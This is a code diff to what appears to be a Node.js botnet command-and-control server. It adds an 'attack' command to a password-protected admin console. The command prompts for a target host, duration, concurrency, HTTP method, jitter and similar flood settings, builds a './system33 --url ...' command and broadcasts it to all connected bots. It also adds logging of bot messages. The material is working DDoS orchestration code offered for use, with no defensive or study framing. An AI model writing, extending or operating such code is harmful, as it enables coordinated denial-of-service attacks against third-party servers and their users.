@@ -138,6 +138,9 @@ function handleAdminConnection(socket) {
 
     let isAuthenticated = false;
     let passwordBuffer = '';
+    let attackMode = false;
+    let attackParams = {};
+    let currentParam = '';
 
     // Send password prompt
     socket.write('Password: ');
@@ -148,6 +151,7 @@ function handleAdminConnection(socket) {
         'WebSocket System - Admin Console\r\n' +
         '============================================================\r\n' +
         'Commands:\r\n' +
+        '  attack                - Launch attack (prompts for parameters)\r\n' +
         '  bots                  - Show number of connected bots\r\n' +
         '  list                  - List all connected bots\r\n' +
         '  stats                 - Show connection statistics\r\n' +
@@ -202,12 +206,69 @@ function handleAdminConnection(socket) {
 
             const command = line.trim();
             if (!command) {
-                socket.write('admin> ');
+                if (attackMode) {
+                    socket.write(`${currentParam}> `);
+                } else {
+                    socket.write('admin> ');
+                }
+                continue;
+            }
+
+            // Handle attack parameter collection
+            if (attackMode) {
+                attackParams[currentParam] = command;
+                
+                const paramOrder = ['HOST', 'TIME', 'CONCURRENCY', 'HTTP-METHOD', 'ADAPTIVE-DELAY', 'JITTER', 'HTTP-PROTOCOL', 'BURST', 'RANDOM-PATH'];
+                const currentIndex = paramOrder.indexOf(currentParam);
+                
+                if (currentIndex < paramOrder.length - 1) {
+                    // Move to next parameter
+                    currentParam = paramOrder[currentIndex + 1];
+                    socket.write(`${currentParam}> `);
+                } else {
+                    // All parameters collected, send attack command
+                    attackMode = false;
+                    
+                    const attackCommand = `./system33 --url ${attackParams.HOST} --duration ${attackParams.TIME} --http-method ${attackParams['HTTP-METHOD']} --jitter ${attackParams.JITTER} --http-protocol ${attackParams['HTTP-PROTOCOL']} --adaptive-delay ${attackParams['ADAPTIVE-DELAY']}`;
+                    
+                    socket.write('\r\n');
+                    socket.write('Attack command prepared:\r\n');
+                    socket.write(`${attackCommand}\r\n`);
+                    socket.write('\r\n');
+                    socket.write(`Sending to ${manager.botConnections.size} bots...\r\n`);
+                    
+                    // Send to all bots
+                    manager.broadcastToBots({
+                        type: 'attack',
+                        message: attackCommand,
+                        params: attackParams,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    socket.write(`Attack command sent to ${manager.botConnections.size} bots!\r\n`);
+                    socket.write('admin> ');
+                    
+                    // Reset attack params
+                    attackParams = {};
+                    currentParam = '';
+                }
                 continue;
             }
 
             // Process commands
-            if (command.toLowerCase() === 'help') {
+            if (command.toLowerCase() === 'attack') {
+                socket.write('\x1b[2J\x1b[H');
+                socket.write('============================================================\r\n');
+                socket.write('ATTACK MODE\r\n');
+                socket.write('============================================================\r\n');
+                socket.write('Please provide the following parameters:\r\n');
+                socket.write('\r\n');
+                
+                attackMode = true;
+                attackParams = {};
+                currentParam = 'HOST';
+                socket.write(`${currentParam}> `);
+            } else if (command.toLowerCase() === 'help') {
                 socket.write('\x1b[2J\x1b[H');
                 socket.write(welcome);
             } else if (command.toLowerCase() === 'bots') {
@@ -218,7 +279,6 @@ function handleAdminConnection(socket) {
                 socket.write('\x1b[2J\x1b[H');
                 const stats = manager.getStats();
                 let response = `Connected bots (${stats.bots}):\r\n`;
-                socket.write('\x1b[2J\x1b[H');
                 stats.bot_ids.forEach(botId => {
                     response += `  - ${botId}\r\n`;
                 });
@@ -240,8 +300,6 @@ function handleAdminConnection(socket) {
                 });
                 socket.write(`Sent to ${manager.botConnections.size} bots\r\n`);
             }
-
-            socket.write('admin> ');
         }
     });
 
@@ -286,6 +344,9 @@ function handleBotConnection(websocket) {
             try {
                 const message = JSON.parse(data.toString());
                 console.log(`[INFO] Message from ${botId}:`, message);
+                
+                // Log message to file
+                logMessage(botId, message);
 
                 // Forward bot messages to admins
                 // manager.broadcastToAdmins(
